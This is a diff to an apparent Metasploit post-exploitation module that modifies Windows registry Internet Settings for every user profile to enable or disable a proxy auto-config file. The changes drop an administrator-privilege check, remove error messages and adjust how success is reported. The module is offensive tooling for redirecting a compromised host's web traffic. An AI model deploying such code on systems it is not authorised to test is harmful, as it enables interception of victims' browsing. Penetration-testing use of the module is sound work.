@@ -39,11 +39,6 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		unless is_admin?
-			print_error("You don't have enough privileges. Try getsystem.")
-			return
-		end
-
 		if datastore['LOCAL_PAC'].nil? and datastore['REMOTE_PAC'].nil?
 			print_error("You must set a remote or local PAC file.")
 			return
@@ -93,7 +88,6 @@ class Metasploit3 < Msf::Post
 			begin
 				registry_setvaldata(key,value_auto,file,"REG_SZ")
 			rescue::Exception => e
-				print_status("There was an error setting the registry value: #{e.class} #{e}")
 			end
 			print_good ("Proxy PAC enabled.") if change_defConSettings(16,'05',key + '\\Connections')
 		end
@@ -110,17 +104,18 @@ class Metasploit3 < Msf::Post
 
 	def disable_proxy()
 		value_enable = "ProxyEnable"
+		profile = false
 		registry_enumkeys('HKU').each do |k|
 			next unless k.include? "S-1-5-21"
 			next if k.include? "_Classes"
 			key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
 			begin
 				registry_setvaldata(key,value_enable,0,"REG_DWORD")
-				print_good ("Proxy disable.")
+				profile = true
 			rescue::Exception => e
-				print_status("There was an error setting the registry value: #{e.class} #{e}")
 			end
 		end
+		print_good ("Proxy disable.") if profile
 	end
 
 	def change_defConSettings(offset,value,key)
@@ -131,7 +126,6 @@ class Metasploit3 < Msf::Post
 			binary_data[offset,2] = value
 			registry_setvaldata(key,value_defCon,["%x" % binary_data.to_i(16)].pack("H*"),"REG_BINARY")
 		rescue::Exception => e
-			print_status("There was an error setting the registry value: #{e.class} #{e}")
 			return false
 		end
 	end
